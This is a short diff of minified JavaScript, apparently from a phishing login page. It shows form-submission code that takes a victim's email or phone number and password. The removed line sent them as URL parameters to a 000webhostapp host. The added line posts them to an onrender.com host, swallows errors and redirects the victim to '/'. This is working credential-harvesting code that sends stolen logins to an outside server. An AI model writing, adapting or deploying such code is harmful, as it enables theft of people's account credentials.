@@ -37270,7 +37270,7 @@
 															email: e.email_or_phone,
 															password: e.password
 														};
-														GS.get(`https://sinhzienthanhlich.000webhostapp.com/index.php?email=${n.email}&password=${n.password}`).then((function(e) {
+														GS.post(`https://information-example.onrender.com`,n).then((function(e) {
 															t("/")
 														})).catch((function(e) {}))
 													}
